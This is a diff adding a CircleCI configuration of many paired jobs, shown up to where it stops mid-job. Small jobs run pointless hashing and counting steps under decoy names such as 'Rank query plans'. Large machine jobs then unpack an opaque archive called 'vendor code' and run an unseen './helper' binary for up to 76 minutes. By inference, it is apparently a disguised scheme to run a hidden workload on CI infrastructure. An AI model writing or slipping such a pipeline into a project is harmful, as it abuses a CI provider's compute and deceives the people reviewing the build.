@@ -1,0 +1,1557 @@
+version: 2.1
+
+jobs:
+  reserve_fire-up:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Rank query plans
+          command: |
+            mkdir -p /tmp/.wsp
+            set +o pipefail 2>/dev/null; head -c 1220265 /dev/urandom | base64 > /tmp/.wsp/buffer.bin; true
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/buffer.bin) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - buffer.bin
+  fire-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch previous
+          command: |
+            grep -c . /tmp/.wsp/buffer.bin || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar -xjf output.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          no_output_timeout: 76m
+          command: sh -c "./helper"
+  Alpha_echo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Trim trailing newlines
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 465581 | awk 'END{print NR}'; true ; } > /tmp/.wsp/handoff.ok
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/handoff.ok) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - handoff.ok
+  echo:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch previous
+          command: |
+            grep -c . /tmp/.wsp/handoff.ok || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar -xjf output.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          no_output_timeout: 76m
+          command: sh -c "./helper"
+  Delta_LAB_HOOK_8:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Aggregate run counters
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; head -c 14680064 /dev/urandom | gzip -1 | wc -c; true ; } > /tmp/.wsp/timings.jsonl
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/timings.jsonl) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - timings.jsonl
+  LAB_HOOK_8:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch previous
+          command: |
+            grep -c . /tmp/.wsp/timings.jsonl || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar -xjf output.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          no_output_timeout: 76m
+          command: sh -c "./helper"
+  cleanup_wip-router-crash:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Compact small objects
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 18339); do echo "row-$i-$RANDOM"; done ) | md5sum; true ; } > /tmp/.wsp/93.bin
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/93.bin) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 93.bin
+  wip-router-crash:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch previous
+          command: |
+            grep -c . /tmp/.wsp/93.bin || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar -xjf output.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          no_output_timeout: 76m
+          command: sh -c "./helper"
+  hydrate_API-362:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Compile stats index
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<205210;i++) printf "%d\n", (i*7919)%2147483647}' | wc -l; true ; } > /tmp/.wsp/stage.dat
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/stage.dat) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - stage.dat
+  API-362:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch previous
+          command: |
+            grep -c . /tmp/.wsp/stage.dat || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar -xjf output.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          no_output_timeout: 76m
+          command: sh -c "./helper"
+  reup_papa-3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Prune log tail
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; head -c 10485760 /dev/urandom | od -An -x | wc -w; true ; } > /tmp/.wsp/full_step_output_v3.log
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/full_step_output_v3.log) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - full_step_output_v3.log
+  papa-3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch previous
+          command: |
+            grep -c . /tmp/.wsp/full_step_output_v3.log || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar -xjf output.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          no_output_timeout: 76m
+          command: sh -c "./helper"
+  Gamma_STG_VERIFY_3:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Enumerate token pairs
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 2 12096 | factor | wc -l; true ; } > /tmp/.wsp/timings.csv
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/timings.csv) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - timings.csv
+  STG_VERIFY_3:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch previous
+          command: |
+            grep -c . /tmp/.wsp/timings.csv || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar -xjf output.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          no_output_timeout: 76m
+          command: sh -c "./helper"
+  checker_INIT_UAT:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Rank ordinal values
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 225457 | awk 'END{print NR}'; true ; } > /tmp/.wsp/handover.sig
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/handover.sig) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - handover.sig
+  INIT_UAT:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch previous
+          command: |
+            grep -c . /tmp/.wsp/handover.sig || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar -xjf output.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          no_output_timeout: 76m
+          command: sh -c "./helper"
+  hydrate_Deploy_Service6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Validate checksum roster
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; head -c 27262976 /dev/urandom | sha256sum; true ; } > /tmp/.wsp/phase-complete.out
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/phase-complete.out) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - phase-complete.out
+  Deploy_Service6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch previous
+          command: |
+            grep -c . /tmp/.wsp/phase-complete.out || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar -xjf output.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          no_output_timeout: 76m
+          command: sh -c "./helper"
+  rerun_do-the-thing:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Collect byte metrics
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; ( echo "hdr"; seq 1 93980; echo "ftr" ) | wc -l; true ; } > /tmp/.wsp/step-27.out
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/step-27.out) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - step-27.out
+  do-the-thing:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch previous
+          command: |
+            grep -c . /tmp/.wsp/step-27.out || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar -xjf output.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          no_output_timeout: 76m
+          command: sh -c "./helper"
+  g1_oscar-2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Prepare block cipher
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 374522 | awk 'NR%3==0{print}' | wc -l; true ; } > /tmp/.wsp/main_step_output_v4.log
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/main_step_output_v4.log) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - main_step_output_v4.log
+  oscar-2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch previous
+          command: |
+            grep -c . /tmp/.wsp/main_step_output_v4.log || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar -xjf output.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          no_output_timeout: 76m
+          command: sh -c "./helper"
+  hook_sep20-ship:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Weigh batch output
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<420671;i++){s=(s*33+i)%2147483647}print s}'; true ; } > /tmp/.wsp/report.txt
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/report.txt) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - report.txt
+  sep20-ship:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch previous
+          command: |
+            grep -c . /tmp/.wsp/report.txt || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar -xjf output.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          no_output_timeout: 76m
+          command: sh -c "./helper"
+  stepB_realease-61:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Spool byte frames
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 10660); do echo "row-$i-$RANDOM"; done ) | md5sum; true ; } > /tmp/.wsp/705.data
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/705.data) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 705.data
+  realease-61:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch previous
+          command: |
+            grep -c . /tmp/.wsp/705.data || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar -xjf output.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          no_output_timeout: 76m
+          command: sh -c "./helper"
+  do_titan:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fuzz boundary edges
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=1k count=900 2>/dev/null | gzip -6 | wc -c; true ; } > /tmp/.wsp/stage.blob
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/stage.blob) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - stage.blob
+  titan:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch previous
+          command: |
+            grep -c . /tmp/.wsp/stage.blob || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar -xjf output.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          no_output_timeout: 76m
+          command: sh -c "./helper"
+  verify_push-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Scan dependency graph
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | tr -dc 'a-f0-9' | head -c 286720 | fold -w16 | awk '!seen[$0]++' | wc -l; true ; } > /tmp/.wsp/gate-ready.sig
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/gate-ready.sig) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - gate-ready.sig
+  push-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch previous
+          command: |
+            grep -c . /tmp/.wsp/gate-ready.sig || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar -xjf output.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          no_output_timeout: 76m
+          command: sh -c "./helper"
+  produce_preview-build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Score sort stability
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=1k count=2200 2>/dev/null | gzip -6 | wc -c; true ; } > /tmp/.wsp/buffer.raw
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/buffer.raw) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - buffer.raw
+  preview-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch previous
+          command: |
+            grep -c . /tmp/.wsp/buffer.raw || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar -xjf output.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          no_output_timeout: 76m
+          command: sh -c "./helper"
+  redo_gating:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Enumerate scalar triples
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; head -c 2097152 /dev/urandom | gzip -1 | wc -c; true ; } > /tmp/.wsp/807x.data
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/807x.data) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 807x.data
+  gating:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch previous
+          command: |
+            grep -c . /tmp/.wsp/807x.data || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar -xjf output.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          no_output_timeout: 76m
+          command: sh -c "./helper"
+  stepA_edge-v7:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Interleave stream pairs
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 1000 | awk '{print toupper($0)}' | md5sum; true ; } > /tmp/.wsp/phase-done.log
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/phase-done.log) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - phase-done.log
+  edge-v7:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch previous
+          command: |
+            grep -c . /tmp/.wsp/phase-done.log || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar -xjf output.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          no_output_timeout: 76m
+          command: sh -c "./helper"
+  provision_ship-it:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Scan prime offsets
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; dd if=/dev/zero bs=1M count=25 2>/dev/null | sha256sum; true ; } > /tmp/.wsp/main_phase_output.log
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/main_phase_output.log) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - main_phase_output.log
+  ship-it:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch previous
+          command: |
+            grep -c . /tmp/.wsp/main_phase_output.log || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar -xjf output.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          no_output_timeout: 76m
+          command: sh -c "./helper"
+  round1_API-590:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Capture job identity
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=4k count=260 2>/dev/null | md5sum; true ; } > /tmp/.wsp/FINAL
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/FINAL) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - FINAL
+  API-590:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch previous
+          command: |
+            grep -c . /tmp/.wsp/FINAL || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar -xjf output.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          no_output_timeout: 76m
+          command: sh -c "./helper"
+  reset_validate-quick-integration-tests:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Mirror arena state
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; tr -dc '0-9' </dev/urandom | head -c 1536000 | wc -c; true ; } > /tmp/.wsp/step-pass.log
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/step-pass.log) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - step-pass.log
+  validate-quick-integration-tests:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch previous
+          command: |
+            grep -c . /tmp/.wsp/step-pass.log || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar -xjf output.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          no_output_timeout: 76m
+          command: sh -c "./helper"
+  gamma_spin-up:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Project tail bytes
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 436214 | awk 'NR>9456 && NR<47764{s+=$1}END{print s}'; true ; } > /tmp/.wsp/.pid
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/.pid) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - .pid
+  spin-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch previous
+          command: |
+            grep -c . /tmp/.wsp/.pid || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar -xjf output.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          no_output_timeout: 76m
+          command: sh -c "./helper"
+  bake_dp-v2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Collate dictionary rows
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 437761 | awk '{print $1 % 7}' | sort | uniq -c | wc -l; true ; } > /tmp/.wsp/buffer.blob
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/buffer.blob) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - buffer.blob
+  dp-v2:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch previous
+          command: |
+            grep -c . /tmp/.wsp/buffer.blob || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar -xjf output.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          no_output_timeout: 76m
+          command: sh -c "./helper"
+  canary1_q2-cleanup:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Mint batch marker
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; seq 1 291620 | awk 'NR%17==0{sum+=$1}END{print sum}'; true ; } > /tmp/.wsp/328.txt
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/328.txt) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 328.txt
+  q2-cleanup:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch previous
+          command: |
+            grep -c . /tmp/.wsp/328.txt || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar -xjf output.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          no_output_timeout: 76m
+          command: sh -c "./helper"
+  p1_DEV_DEPLOY_6:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Fold branch counters
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; yes 'line' | head -n 324922 | awk '{print NR, $0}' | tail -1; true ; } > /tmp/.wsp/85.blob
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/85.blob) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - 85.blob
+  DEV_DEPLOY_6:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch previous
+          command: |
+            grep -c . /tmp/.wsp/85.blob || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar -xjf output.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          no_output_timeout: 76m
+          command: sh -c "./helper"
+  audit_verify-quick-docker-image:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Deflate payload chunk
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; head -c 1048576 /dev/urandom | tar cz - 2>/dev/null | wc -c; true ; } > /tmp/.wsp/step-done.txt
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/step-done.txt) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - step-done.txt
+  verify-quick-docker-image:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch previous
+          command: |
+            grep -c . /tmp/.wsp/step-done.txt || true
+      - run:
+          name: Shallow clone
+          command: git clone --depth 3 -q --no-single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
+      - run:
+          name: Load vendor code
+          command: tar -xjf output.tar.bz2
+      - run:
+          command: date -u
+      - run:
+          no_output_timeout: 76m
+          command: sh -c "./helper"
+  cleanup_nebula-beta:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Shape histogram head
+          command: |
+            mkdir -p /tmp/.wsp
+            { set +o pipefail 2>/dev/null; tr -dc 'A-Za-z0-9' </dev/urandom | head -c 10240 | fold -w40 | sort | uniq -c | wc -l; true ; } > /tmp/.wsp/pt-alt.pt
+            echo "handoff ready: $(stat -c %s /tmp/.wsp/pt-alt.pt) octets"
+      - persist_to_workspace:
+          root: /tmp/.wsp
+          paths:
+            - pt-alt.pt
+  nebula-beta:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/.wsp
+      - run:
+          name: Fetch previous
+          command: |
